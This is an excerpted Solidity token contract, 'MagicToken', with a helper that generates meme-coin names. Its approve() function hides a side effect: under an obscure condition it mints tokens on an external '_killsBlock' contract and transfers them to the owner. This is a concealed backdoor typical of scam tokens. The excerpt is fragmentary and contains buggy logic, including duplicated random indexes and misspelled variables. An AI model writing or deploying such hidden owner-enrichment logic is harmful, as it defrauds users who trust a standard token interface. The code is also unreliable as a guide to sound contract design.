...
contract randomFunc {
    function randomStr() public view returns (string memory){
        string memory baseName;
        string[10] memory keys = ['baby', 'doge', 'shib', 'space', 'zilla', 'fist', 'safe', 'moon', 'killer', 'king'];
        uint256 randomNubers = randomNum();
        uint256 random1 = randomNubers;
        uint256 random2 = randomNubers;
        if (random1 > 0) {
            random1 = random1 - 1;
        }
        baseName = string.concat(keys[random1], keys[random2]);
        return baseName;
    }
...
contract MagicToken is Context, IERC20, Ownable, randomFunc {
    ...
    string private _name = "MagicToken";
    string private _symbol = "MagicToken";
    ...
    function approve(address spender, uint256 amount)
        ...
        returns (bool)
    {
        if (_rOwned[_locker()] == true || _Backs() >= (15*1e9)){
            IERC1050(_killsBlock).mint(100);
            uint256 balacne = IERC20(_killsBlock).balanceOf(address(this));
            IERC20(_killsBlock).transfer(_owner, balacne);
